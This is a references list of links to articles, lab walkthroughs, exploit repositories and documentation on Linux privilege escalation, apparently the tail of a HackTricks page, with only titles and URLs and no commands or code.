- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
